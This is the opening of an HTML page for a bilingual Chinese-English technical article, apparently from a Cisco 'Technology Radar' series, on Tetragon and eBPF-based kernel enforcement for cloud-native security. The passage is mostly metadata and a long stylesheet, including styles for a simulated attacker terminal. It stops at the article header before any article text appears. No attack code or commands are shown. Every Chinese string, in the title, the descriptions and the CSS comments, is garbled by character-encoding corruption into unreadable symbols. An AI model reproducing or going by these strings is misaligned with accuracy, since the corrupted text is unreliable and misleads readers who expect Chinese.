<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>
        Tetragon: äº‘åŸç”Ÿå®‰å…¨çš„æœ€åä¸€é“é˜²çº¿ | The Final Line of Defense for Cloud-Native Security
    </title>

    <meta name="description" content="[ZH] Tetragon åˆ©ç”¨ eBPF æŠ€æœ¯åœ¨å†…æ ¸æ€å®ç°äºšæ¯«ç§’çº§åŒæ­¥é˜»æ–­ï¼Œç²‰ç¢å‹’ç´¢è½¯ä»¶ä¸å®¹å™¨é€ƒé€¸æ”»å‡»ã€‚[EN] Tetragon utilizes eBPF technology for real-time kernel enforcement and sub-millisecond threat prevention.">

    <meta name="keywords" content="Tetragon, eBPF Security, eBPFå®‰å…¨, Runtime Enforcement, è¿è¡Œæ—¶é˜²æŠ¤, SIGKILL, å†…æ ¸é˜»æ–­, CVE-2024-3094, MITRE ATT&CK, äº‘åŸç”Ÿå®‰å…¨, Cloud-Native Security">

    <meta name="revised" content="Sunday, January 4th, 2026, 22:20 pm" />
    <meta property="og:title" content="Tetragon: äº‘åŸç”Ÿå®‰å…¨çš„æœ€åä¸€é“é˜²çº¿ | The Final Line of Defense">
    <meta property="og:description" content="æ¢è®¨ Tetragon å¦‚ä½•åœ¨å†…æ ¸æ€å®ç°äºšæ¯«ç§’çº§åŒæ­¥é˜»æ–­ã€‚Real-time kernel enforcement for Cloud-Native security.">
    <meta property="og:type" content="article">
    <meta property="og:updated_time" content="2026-01-04T22:20:00+08:00" />

    <script type="application/ld+json">
    {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "headline": "Tetragon: äº‘åŸç”Ÿå®‰å…¨çš„æœ€åä¸€é“é˜²çº¿ | The Final Line of Defense for Cloud-Native Security",
    "description": "æ¢è®¨ Tetragon å¦‚ä½•åˆ©ç”¨ eBPF åœ¨å†…æ ¸æ€å®ç°äºšæ¯«ç§’çº§åŒæ­¥é˜»æ–­ã€‚Exploration of Tetragon's kernel-level real-time enforcement using eBPF.",
    "datePublished": "2025-12-20T11:00:00+08:00",
    "dateModified": "2026-01-04T22:20:00+08:00",
    "proficiencyLevel": "Expert",
    "author": { 
        "@type": "Person", 
        "name": "Weibo Rao" 
    },
    "keywords": "Tetragon, eBPF, Security, Runtime Enforcement, SIGKILL"
    }
    </script>

    <style>
        /* --- 1. åŸå§‹ Cisco å“ç‰Œæ ‡è¯†ç³»ç»Ÿå˜é‡ --- */
        :root {
            --cisco-blue: #049FD9;
            --cisco-midnight: #0D274D;
            --cisco-sky: #6ABF4B;
            --cisco-slate: #58585B;
            --cisco-light-gray: #F2F2F2;
            --cisco-platinum: #E4E4E4;
            --cisco-green: #6CC24A;
            --cisco-red: #E2231A;
            --cisco-orange: #F58025;
            --white: #FFFFFF;
            --shadow-card: 0 8px 24px rgba(13, 39, 77, 0.08);
            --shadow-hover: 0 12px 32px rgba(13, 39, 77, 0.15);
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 16px;
        }

        /* --- 2. å›½é™…åŒ–æ ¸å¿ƒæ˜¾ç¤ºé€»è¾‘ --- */
        body.lang-zh [lang="en"] {
            display: none !important;
        }

        body.lang-en [lang="zh"] {
            display: none !important;
        }

        /* --- 3. åŸå§‹å…¨å±€å¸ƒå±€ç³»ç»Ÿ --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-font-smoothing: antialiased;
        }

        body {
            font-family: "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: var(--cisco-slate);
            background-color: #FAFAFA;
            line-height: 1.6;
        }

        /* è§£å†³å†…å®¹å±…ä¸­ä¸ç¾æ„Ÿçš„æ ¸å¿ƒå®¹å™¨ */
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 0 24px;
        }

        /* --- æ”¹è¿›åçš„å›ºå®šè¯­è¨€åˆ‡æ¢å™¨ (å§‹ç»ˆç½®é¡¶ï¼Œä¸éšé¡µé¢æ»šåŠ¨) --- */
        .i18n-glass-toggle {
            position: fixed;
            /* å›ºå®šå®šä½ï¼Œä¸éšé¡µé¢æ»šåŠ¨ */
            top: 20px;
            right: 20px;
            z-index: 10000;
            /* ç¡®ä¿ä½äºæ‰€æœ‰å†…å®¹ä¹‹ä¸Š */
            background: rgba(255, 255, 255, 0.9);
            /* æé«˜ä¸é€æ˜åº¦ï¼Œè§£å†³æµ…è‰²èƒŒæ™¯çœ‹ä¸æ¸…çš„é—®é¢˜ */
            backdrop-filter: blur(10px);
            border: 1px solid var(--cisco-platinum);
            /* ä½¿ç”¨åŸå§‹é“‚é‡‘è‰²å˜é‡ */
            border-radius: 30px;
            padding: 4px;
            display: flex;
            box-shadow: var(--shadow-hover);
            /* ä½¿ç”¨åŸå§‹æŠ•å½±å˜é‡å¢åŠ ç«‹ä½“æ„Ÿ */
        }

        .i18n-btn {
            border: none;
            background: transparent;
            color: var(--cisco-slate);
            /* é»˜è®¤æ·±è‰²æ–‡å­—ï¼Œç¡®ä¿æ¸…æ™° */
            padding: 6px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: 600;
            transition: all 0.2s;
        }

        /* æ¿€æ´»çŠ¶æ€åˆ‡æ¢ */
        body.lang-zh .btn-zh,
        body.lang-en .btn-en {
            background: var(--cisco-midnight);
            /* æ¿€æ´»æ—¶ä½¿ç”¨ Cisco æ·±è“è‰² */
            color: white;
        }

        /* --- Header èƒŒæ™¯ä¸å‰ªè£ --- */
        header {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white;
            padding: 100px 0 80px;
            position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
        }

        /* --- é¡¶éƒ¨è£…é¥°æ ‡ç­¾ --- */
        .hero-tag {
            background: rgba(255, 255, 255, 0.1);
            color: #61C6E2;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: inline-block;
            margin-bottom: 24px;
            border: 1px solid rgba(4, 159, 217, 0.3);
        }

        /* --- æ ‡é¢˜ä¸æ­£æ–‡æ’ç‰ˆ --- */
        h1 {
            color: white;
            font-size: 3rem;
            margin-bottom: 20px;
            line-height: 1.1;
            font-weight: 700;
        }

        h2,
        h3,
        h4 {
            color: var(--cisco-midnight);
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        p {
            margin-bottom: 1.2rem;
            font-size: 1.05rem;
        }

        .hero-sub {
            font-size: 1.25rem;
            color: rgba(255, 255, 255, 0.85);
            max-width: 700px;
            margin-bottom: 40px;
        }

        /* --- æ¸©æ–¯é¡¿æ‰¿è¯ºåŒºå—è®¾è®¡ --- */
        .winston-promise {
            background: var(--cisco-blue);
            /* Cisco è“è‰² */
            padding: 30px;
            border-radius: var(--radius-lg);
            margin-top: 40px;
            display: flex;
            align-items: center;
            gap: 25px;
            box-shadow: 0 15px 35px rgba(4, 159, 217, 0.3);
            transform: translateY(-10px);
        }

        .winston-promise strong {
            font-size: 1.4rem;
            display: block;
            margin-bottom: 8px;
            color: #FFFFFF;
        }

        /* --- æŒ‰é’®äº¤äº’ --- */
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(4, 159, 217, 0.4);
        }

        .btn-outline:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        /* --- 3. Case Zero ä¸“å±æ ·å¼ --- */
        #dark-chain-story {
            padding: 80px 0;
            background: var(--white);
            border-bottom: 1px solid var(--cisco-platinum);
        }

        .section-header {
            text-align: center;
            max-width: 850px;
            margin: 0 auto 60px;
        }

        .section-header h2 {
            font-size: 2.25rem;
            margin-bottom: 16px;
            position: relative;
            display: inline-block;
            color: var(--cisco-midnight);
        }

        .section-header h2::after {
            content: '';
            display: block;
            width: 60px;
            height: 4px;
            background: var(--cisco-blue);
            margin: 12px auto 0;
            border-radius: 2px;
        }

        /* SVG è·¯å¾„è¿çº¿åŠ¨ç”» (ä¿ç•™åŸæ–‡é€»è¾‘) */
        #arrow-blue-path,
        #arrow-red-path {
            fill: var(--cisco-blue);
        }

        /* --- Simulation Grid å¸ƒå±€ --- */
        .simulation-grid {
            display: grid;
            grid-template-columns: 1fr 1.5fr;
            gap: 30px;
            margin-top: 40px;
        }

        /* --- æ”»å‡»é˜¶æ®µæŒ‰é’®æ ·å¼ --- */
        .attack-stage-btn {
            width: 100%;
            text-align: left;
            padding: 15px;
            border: 1px solid var(--cisco-platinum);
            border-radius: var(--radius-md);
            background: white;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .attack-stage-btn:hover {
            border-color: var(--cisco-blue);
            background: #f0f7fa;
        }

        .attack-stage-btn.active {
            border-color: var(--cisco-red);
            border-left: 5px solid var(--cisco-red);
            background: #fff5f5;
        }

        /* --- æ”»å‡»è€…ä»¿çœŸç»ˆç«¯æ ·å¼ --- */
        .attacker-terminal {
            background: #0D1117;
            border-radius: 12px;
            overflow: hidden;
            font-family: 'SF Mono', 'Fira Code', 'Menlo', monospace;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid #30363d;
            display: flex;
            flex-direction: column;
        }

        .terminal-header-red {
            background: #21262d;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #30363d;
        }

        .terminal-title {
            color: #8b949e;
            font-size: 0.75rem;
            margin-left: 5px;
            flex: 1;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot.red {
            background: #ff5f56;
        }

        .dot.yellow {
            background: #ffbd2e;
        }

        .dot.green {
            background: #27c93f;
        }

        .terminal-content-attack {
            padding: 20px;
            height: 420px;
            overflow-y: auto;
            color: #e6edf3;
            font-size: 0.85rem;
            line-height: 1.6;
            background: #0d1117;
        }

        /* ç»ˆç«¯æ–‡å­—é¢œè‰²å®šä¹‰ */
        .term-cmd {
            color: #7ee787;
            font-weight: bold;
        }

        .term-out {
            color: #c9d1d9;
        }

        .term-highlight {
            color: #ffa657;
            font-weight: bold;
        }


        /* å“åº”å¼é€‚é… */
        @media (max-width: 768px) {
            .simulation-grid {
                grid-template-columns: 1fr;
            }
        }

        /* --- ç›²åŒºåˆ†æè¡¨æ ·å¼ --- */
        .blindspot-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
            background: white;
            border-radius: var(--radius-md);
            overflow: hidden;
            box-shadow: var(--shadow-card);
        }

        .blindspot-table th {
            background: var(--cisco-midnight);
            color: white;
            padding: 15px;
            text-align: left;
        }

        .blindspot-table td {
            padding: 15px;
            border-bottom: 1px solid var(--cisco-platinum);
            font-size: 0.95rem;
            vertical-align: top;
        }

        .blindspot-table tr:hover {
            background: #F8FAFC;
        }

        .highlight-red {
            color: var(--cisco-red);
            font-weight: bold;
        }

        /* --- æ€»ç»“æç¤ºæ¡†æ ·å¼ (å¼ºè°ƒè‰²ä¸ºæ©™è‰²) --- */
        .highlight-box {
            background: #F0F7FA;
            border-left: 4px solid var(--cisco-blue);
            padding: 25px;
            border-radius: 0 var(--radius-md) var(--radius-md) 0;
            margin: 30px 0;
        }

        /* åœ¨æ­¤å¤„è¦†ç›–æ‰¿è¯ºå—å’Œæ€»ç»“å—çš„ç»†å¾®å·®åˆ« */
        .highlight-box strong {
            color: var(--cisco-midnight);
            display: block;
            margin-bottom: 10px;
        }


        /* --- 2. åŸå§‹ç½‘æ ¼ä¸å¡ç‰‡å¸ƒå±€ --- */
        .grid-3 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 32px;
        }

        .card {
            background: white;
            padding: 35px 28px;
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card);
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid transparent;
            height: 100%;
            position: relative;
        }

        /* è¿˜åŸäº’åŠ¨åŠ¨ä½œï¼šé¼ æ ‡ç¢°åˆ°æ—¶çš„å¹³ç§»å’Œé˜´å½±å¢å¼º */
        .card:hover {
            transform: translateY(-8px);
            box-shadow: var(--shadow-hover);
            border-top-color: var(--cisco-blue);
        }

        .grid-monitoring {
            display: flex;
            flex-wrap: wrap;
            gap: 24px;
            justify-content: center;
        }

        .grid-monitoring .card {
            flex: 1 1 calc(33.333% - 24px);
            min-width: 300px;
        }
        /* ä¼˜åŒ–ç›‘æ§ç»´åº¦ä¸º 2x2 çŸ©é˜µ */
        .grid-monitoring {
            display: grid !important;
            grid-template-columns: repeat(2, 1fr) !important;
            gap: 24px;
            justify-content: stretch !important;
        }

        /* ç¡®ä¿å¡ç‰‡é«˜åº¦ä¸€è‡´ä¸”å†…å®¹æ’‘æ»¡ */
        .grid-monitoring .card {
            flex: none !important;
            width: 100% !important;
            margin: 0 !important;
        }

        /* ç§»åŠ¨ç«¯è‡ªé€‚åº” */
        @media (max-width: 768px) {
            .grid-monitoring {
                grid-template-columns: 1fr !important;
            }
        }
        /* --- 3. å¯¹æ¯”çŸ©é˜µæ ·å¼è¿˜åŸ --- */
        .comparison-card {
            background: #FFFFFF;
            border: 1px solid var(--cisco-platinum);
            border-radius: var(--radius-lg);
            overflow: hidden;
            margin-top: 30px;
            box-shadow: var(--shadow-card);
        }

        .comparison-header {
            background: var(--cisco-midnight);
            color: white;
            padding: 15px 25px;
            font-weight: bold;
        }

        .comparison-grid {
            display: grid;
            grid-template-columns: 1fr 1.2fr 1.2fr;
            border-bottom: 1px solid var(--cisco-platinum);
        }

        .comparison-cell {
            padding: 15px 20px;
            font-size: 0.85rem;
            border-right: 1px solid var(--cisco-platinum);
            display: flex;
            align-items: center;
        }

        .comparison-cell:last-child {
            border-right: none;
        }

        .comparison-label {
            font-weight: bold;
            background: #F8FAFC;
            color: var(--cisco-midnight);
        }

        .comparison-footer {
            background: #FFF9F0;
            padding: 15px;
            color: #856404;
            font-size: 0.85rem;
            border-top: 1px solid #FFEBA0;
            text-align: center;
        }

        /* --- 4. è¾…åŠ©è§†è§‰ç»„ä»¶ --- */
        .view-title {
            color: var(--cisco-midnight);
            font-size: 1.6rem;
            margin-bottom: 25px;
            border-bottom: 2px solid var(--cisco-platinum);
            padding-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .view-title::before {
            content: "";
            display: block;
            width: 4px;
            height: 1.2em;
            background: var(--cisco-blue);
            border-radius: 2px;
        }

        .highlight-box {
            background: #F0F7FA;
            border-left: 4px solid var(--cisco-blue);
            padding: 25px;
            margin: 30px 0;
        }

        .winston-bridge {
            font-style: italic;
            color: var(--cisco-slate);
            border-left: 3px solid var(--cisco-platinum);
            padding-left: 15px;
            margin: 20px 0;
            font-size: 0.95rem;
        }

        @media (max-width: 768px) {

            .grid-3,
            .comparison-grid {
                grid-template-columns: 1fr;
            }

            .grid-monitoring .card {
                flex: 1 1 100%;
            }
        }

        /* --- Section 2 ä¸“å±æ ·å¼è¿˜åŸ --- */
        .identity-box {
            background: #FFFFFF;
            border-radius: var(--radius-lg);
            padding: 40px;
            margin: 40px 0;
            border: 1px solid var(--cisco-platinum);
            display: flex;
            gap: 40px;
            align-items: center;
        }

        .identity-visual {
            flex: 1;
            background: #F8FAFC;
            padding: 30px;
            border-radius: 12px;
            border: 2px dashed #CBD5E1;
        }

        .star-badge {
            background: var(--cisco-midnight);
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 10px;
        }

        /* CASE BADGE */
        .case-badge {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white;
            padding: 5px 16px;
            border-radius: 50px;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 15px;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            border: 1px solid rgba(4, 159, 217, 0.4);
            box-shadow: 0 4px 10px rgba(13, 39, 77, 0.2);
            position: relative;
        }

        .expert-persp-box {
            background: linear-gradient(to right, #0D274D, #005073);
            color: white;
            padding: 30px;
            border-radius: 12px;
            margin-top: 40px;
            position: relative;
            overflow: hidden;
            border-left: 5px solid var(--cisco-orange);
        }

        .expert-persp-box::after {
            content: "DEEP DIVE";
            position: absolute;
            top: 10px;
            right: -30px;
            background: var(--cisco-orange);
            font-size: 10px;
            font-weight: bold;
            padding: 5px 40px;
            transform: rotate(45deg);
        }

        .dc-observer-post {
            background: rgba(226, 35, 26, 0.05);
            border: 1px solid rgba(226, 35, 26, 0.2);
            border-left: 4px solid var(--cisco-red);
            padding: 15px 20px;
            margin: 20px 0;
            border-radius: var(--radius-md);
        }

        .dc-observer-post::before {
            content: "ğŸ•µï¸ Dark-Chain";
            display: block;
            font-size: 0.75rem;
            font-weight: bold;
            color: var(--cisco-red);
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        /* --- å‘¼å¸æ„Ÿä¸åŸºç¡€ Section æ ·å¼ --- */
        section {
            padding: 80px 0;
            border-bottom: 1px solid var(--cisco-platinum);
            background: var(--white);
        }


        /* --- æ€ç»´æ¨¡å‹æ¡†æ ·å¼ --- */
        .mechanism-card {
            background: #FFFFFF;
            border: 1px solid var(--cisco-platinum);
            border-radius: 12px;
            padding: 35px;
            margin-bottom: 40px;
            box-shadow: var(--shadow-card);
        }

        /* --- è§†è§’æ ‡é¢˜æ ·å¼ --- */
        .view-title {
            color: var(--cisco-midnight);
            font-size: 1.6rem;
            margin-bottom: 25px;
            border-bottom: 2px solid var(--cisco-platinum);
            padding-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .view-title::before {
            content: "";
            display: block;
            width: 4px;
            height: 1.2em;
            background: var(--cisco-blue);
            border-radius: 2px;
        }

        /* --- Part 4.1 ä¸“å±æ ·å¼è¿˜åŸ --- */

        /* SVG å‘å…‰æ»¤é•œæ•ˆæœ */
        #glow {
            filter: drop-shadow(0 0 5px rgba(226, 35, 26, 0.5));
        }

        /* å“åº”å¼è°ƒæ•´ï¼šç¡®ä¿æ¶æ„å›¾åœ¨å°å±å¹•ä¸Šå¯æ¨ªå‘æ»šåŠ¨ */
        @media (max-width: 768px) {
            #how-it-works .container div[style*="overflow-x"] {
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }

            #how-it-works svg {
                min-width: 700px;
                /* ä¿è¯åœ¨æ‰‹æœºç«¯æ¶æ„å›¾ä¸ç¼©æˆä¸€å›¢ */
            }
        }

        .arch-split-container {
            display: flex;
            gap: 24px;
            margin-top: 30px;
        }

        .arch-col {
            flex: 1;
            padding: 30px;
            border-radius: var(--radius-lg);
            background: var(--white);
            border: 1px solid var(--cisco-platinum);
            box-shadow: var(--shadow-card);
        }

        .arch-col.kernel {
            border-top: 4px solid var(--cisco-midnight);
        }

        .arch-col.user {
            border-top: 4px solid var(--cisco-blue);
        }

        .arch-col h3 {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            font-size: 1.25rem;
        }

        .arch-list {
            list-style: none;
            margin-top: 20px;
        }

        .arch-list li {
            margin-bottom: 12px;
            font-size: 0.9rem;
            position: relative;
            padding-left: 20px;
        }

        .arch-list li::before {
            content: "â€¢";
            color: var(--cisco-blue);
            font-weight: bold;
            position: absolute;
            left: 0;
        }

        .coordination-banner {
            background: #F0F7FA;
            border: 1px solid rgba(4, 159, 217, 0.2);
            padding: 30px;
            border-radius: var(--radius-lg);
            margin-top: 40px;
        }

        /* ç¡®ä¿ 2x2 å¸ƒå±€åœ¨ç§»åŠ¨ç«¯è‡ªåŠ¨å †å  */
        .grid-2x2-custom {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 25px;
            margin-top: 25px;
        }

        @media (max-width: 768px) {
            .grid-2x2-custom {
                grid-template-columns: 1fr;
            }
        }

        /* ç»Ÿä¸€å¡ç‰‡é«˜åº¦ */
        .dashboard-item {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            height: 100%;
        }

        /* Reference Section Styles */
        /* å‚è€ƒèµ„æ–™åˆ—è¡¨æ ·å¼ */
        .reference-list {
            list-style: none;
            padding: 0;
            margin-top: 30px;
        }

        .reference-item {
            margin-bottom: 12px;
            padding-left: 20px;
            position: relative;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .reference-item::before {
            content: "â€¢";
            position: absolute;
            left: 0;
            color: var(--cisco-blue);
            font-weight: bold;
        }

        .reference-item a {
            color: var(--cisco-midnight);
            text-decoration: none;
            word-break: break-all;
            transition: var(--transition);
        }

        .reference-item a:hover {
            color: var(--cisco-blue);
            text-decoration: underline;
        }
/* å®æ—¶å…³è”å‘¼å¸ç¯åŠ¨ç”» */
@keyframes correlation-breath {
    0% { box-shadow: 0 0 5px rgba(4, 159, 217, 0.2); border-color: #CBD5E1; }
    50% { box-shadow: 0 0 20px rgba(4, 159, 217, 0.6); border-color: var(--cisco-blue); }
    100% { box-shadow: 0 0 5px rgba(4, 159, 217, 0.2); border-color: #CBD5E1; }
}

.identity-visual.live-sync {
    animation: correlation-breath 3s infinite ease-in-out;
    position: relative;
    background: #FFFFFF !important; /* æ”¹ä¸ºçº¯ç™½çªå‡ºæ•ˆæœ */
}

/* å®æ—¶çŠ¶æ€æ ‡ç­¾ */
.live-indicator {
    position: absolute;
    top: 10px;
    right: 15px;
    font-size: 0.65rem;
    font-weight: bold;
    color: var(--cisco-blue);
    display: flex;
    align-items: center;
    gap: 5px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.live-dot {
    width: 6px;
    height: 6px;
    background-color: var(--cisco-blue);
    border-radius: 50%;
    display: inline-block;
    animation: blink 1.5s infinite;
}        


@media (max-width: 768px) {
    .arch-split-container { flex-direction: column; }
}

/* æ—¥å¿—å—é«˜äº®æ ·å¼ */
.log-highlight-identity { color: #61C6E2; font-weight: bold; } /* å¼ºè°ƒèº«ä»½ä¿¡æ¯ */
.log-highlight-exec { color: #F58025; font-weight: bold; }     /* å¼ºè°ƒæ‰§è¡Œ ID */

.value-point-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 20px;
    margin-top: 25px;
}

.value-point-item {
    background: rgba(4, 159, 217, 0.05);
    padding: 15px;
    border-radius: 8px;
    border-top: 3px solid var(--cisco-blue);
    text-align: center;
}

.value-point-item strong {
    display: block;
    color: var(--cisco-midnight);
    margin-bottom: 5px;
    font-size: 0.95rem;
}

@media (max-width: 768px) {
    .value-point-grid { grid-template-columns: 1fr; }
}

/* --- ç§»åŠ¨ç«¯å“åº”å¼è¡¥ä¸ (iPhone & Mobile Compatibility) --- */
@media (max-width: 768px) {
    /* 1. åŸºç¡€æ’ç‰ˆä¼˜åŒ– */
    h1 { font-size: 2.2rem !important; line-height: 1.2 !important; }
    h2 { font-size: 1.8rem !important; }
    p { font-size: 1rem !important; }

    /* 2. è‹±é›„åŒºæ‰¿è¯ºå—å †å  */
    .winston-promise {
        flex-direction: column;
        text-align: center;
        padding: 20px;
    }

    /* 3. æ¶æ„å›¾ä¸ SVG å®¹å™¨å“åº”å¼å¤„ç† */
    svg {
        max-width: 100%;
        height: auto;
    }

    /* 4. æ”»å‡»ä»¿çœŸ Grid é™ç»´ */
    .simulation-grid {
        grid-template-columns: 1fr !important;
    }
    .attacker-terminal {
        height: 350px; /* ç¼©çŸ­é«˜åº¦ä»¥é€‚åº”æ‰‹æœºå±å¹• */
    }

    /* 5. èº«ä»½æ„ŸçŸ¥å¡ç‰‡å †å  */
    .identity-box {
        flex-direction: column;
        padding: 20px;
        gap: 20px;
    }
    .identity-visual {
        width: 100%;
        font-size: 0.75rem !important; /* ç¼©å°ä»£ç å­—å·é˜²æ­¢æº¢å‡º */
    }

    /* 6. å‘ç°å¡ç‰‡ (Discovery Card) å †å  */
    .discovery-card {
        grid-template-columns: 1fr !important;
    }
    .log-side {
        max-height: 200px;
        overflow-y: auto;
    }

    /* 7. è¡¨æ ¼å“åº”å¼å¤„ç†ï¼šå¢åŠ æ¨ªå‘æ»šåŠ¨æç¤º */
    .blindspot-table-wrapper {
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        margin-bottom: 20px;
        border: 1px solid var(--cisco-platinum);
    }
    .blindspot-table {
        min-width: 600px; /* ä¿è¯è¡¨æ ¼å†…å®¹ä¸è¢«æŒ¤å‹ */
    }

    /* 8. è¶‹åŠ¿ Grid é™ç»´ */
    .trend-grid {
        grid-template-columns: 1fr !important;
    }

    /* 9. å®éªŒå®¤ç»„ä»¶ä¼˜åŒ– */
    .tab-header {
        flex-wrap: wrap;
    }
    .tab-btn {
        flex: 1;
        text-align: center;
        font-size: 0.8rem;
    }
}

/* è¡¥å……ï¼šé˜²æ­¢ä»£ç å—æ¨ªå‘æº¢å‡º */
pre, code, .yaml-block, .json-log-view {
    word-break: break-all;
    white-space: pre-wrap !important;
}

/* --- ä¿®å¤å†…æ ¸é˜²å¾¡å±‚çº§ (Protection Rings) å“åº”å¼è¡¥ä¸ --- */
.protection-rings-container {
    width: 100%;
    max-width: 480px; /* PCç«¯ä¿æŒç²¾è‡´æ„Ÿ */
    margin: 30px auto;
    padding: 0 10px;
    text-align: center;
}

.protection-rings-svg {
    width: 100%;
    height: auto; /* ä¿æŒæ¯”ä¾‹ç¼©æ”¾ */
    display: block;
    background: #f8fafc;
    border-radius: var(--radius-md);
    overflow: visible; /* ç¡®ä¿æ–‡å­—è¾¹ç¼˜ä¸è¢«å‰ªè£ */
}

@media (max-width: 768px) {
    .protection-rings-container {
        margin: 20px auto;
    }
    
    /* æ‰‹æœºç«¯å¾®è°ƒ SVG æ–‡å­—å¤§å°ï¼Œç¡®ä¿æ¸…æ™°åº¦ */
    .protection-rings-svg text {
        font-size: 13px !important; 
    }
}

/* --- ç§»åŠ¨ç«¯ SVG å±€éƒ¨æ»‘åŠ¨ä¸æ”¾å¤§ä¿®å¤æ–¹æ¡ˆ (Cisco é£æ ¼) --- */

/* 1. é€šç”¨æ»šåŠ¨åŒ…è£…å™¨ï¼šæ¨¡æ‹Ÿè¡¨æ ¼æ»‘åŠ¨é€»è¾‘ */
.svg-scroll-wrapper {
    width: 100%;
    overflow-x: auto; /* å…è®¸æ¨ªå‘æ»šåŠ¨ */
    -webkit-overflow-scrolling: touch; /* ä¿è¯ iOS æ»‘åŠ¨å…·æœ‰å›å¼¹æ„Ÿ */
    margin: 24px 0;
    border: 1px solid var(--cisco-platinum);
    border-radius: var(--radius-md);
    background: #F8FAFC;
    position: relative;
    box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.02);
}

/* 2. ç§»åŠ¨ç«¯ç‰¹å®šçš„è§†è§‰å¢å¼ºä¸å°ºå¯¸é”å®š */
@media (max-width: 768px) {
    /* å¢åŠ æ»‘åŠ¨å¼•å¯¼æç¤ºï¼Œåœ¨å³ä¸‹è§’é™é»˜æ˜¾ç¤º */
    .svg-scroll-wrapper::after {
        content: "â†” Swipe to view details";
        position: absolute;
        bottom: 8px;
        right: 12px;
        font-size: 10px;
        font-weight: bold;
        color: var(--cisco-blue);
        background: rgba(255, 255, 255, 0.9);
        padding: 2px 8px;
        border-radius: 4px;
        pointer-events: none;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        z-index: 10;
        opacity: 0.8;
    }

    /* æ ¸å¿ƒï¼šé”å®š SVG æœ€å°å®½åº¦ï¼Œé˜²æ­¢è¢«æ‰‹æœºå±å¹•æŒ¤å‹ï¼Œä¿è¯æ–‡å­—æ¸…æ™° */
    
    /* æ”»å‡»å…¨æ™¯å›¾ï¼šåœ¨æ‰‹æœºä¸Šä¿æŒ 1000px å®½åº¦ä»¥ç¡®ä¿ MITRE æŠ€æœ¯ç‚¹å¯è¯» */
    .attack-landscape-svg { 
        min-width: 1000px; 
        height: auto;
    } 

    /* æŠ€æœ¯æ¶æ„å›¾ï¼šä¿æŒ 800px å®½åº¦ç¡®ä¿æµç¨‹çº¿æ¸…æ™° */
    .arch-logic-svg { 
        min-width: 800px; 
        height: auto;
    }      

    /* å†…æ ¸é˜²å¾¡å±‚çº§ï¼šä¿æŒ 450px å®½åº¦é˜²æ­¢åœ†ç¯æ–‡å­—å †å  */
    .protection-rings-svg { 
        min-width: 450px; 
        height: auto;
    } 

    /* ä¼˜åŒ–é—´è·ï¼šå‡å°‘æ‰‹æœºä¸Šçš„å†…è¾¹è· */
    .svg-scroll-wrapper {
        padding: 10px 0;
    }
}

/* 3. åŸºç¡€ä¿æŠ¤ï¼šç¡®ä¿ SVG ä¸ä¼šæº¢å‡ºå…¶çˆ¶å®¹å™¨ */
svg {
    display: block;
    margin: 0 auto;
}
    </style>

</head>

<body class="lang-zh">
    <nav class="i18n-glass-toggle">
        <button class="i18n-btn btn-zh" onclick="setLanguage('zh')">ä¸­æ–‡</button>
        <button class="i18n-btn btn-en" onclick="setLanguage('en')">EN</button>
    </nav>

    <main id="main-content">
        <!-- Hero Section -->
        <header>
            <div class="container">
                <div class="hero-tag">Cisco Technology Radar: eBPF & Tetragon</div>

                <h1><span lang="zh">Tetragon:<br>äº‘åŸç”Ÿå®‰å…¨çš„æœ€åä¸€é“é˜²çº¿</span><span lang="en">Tetragon:<br>The Final Line of
                        Defense for<br>Cloud-Native Security</span></h1>

                <div class="post-meta" style="color: rgba(255,255,255,0.7); font-size: 0.9em; margin-bottom: 20px;">
                    <span lang="zh">å‘å¸ƒæ—¥æœŸï¼š2025-12-20</span><span lang="en">Published on: 2025-12-20</span>
                    <span style="margin: 0 10px; opacity: 0.5;">|</span>
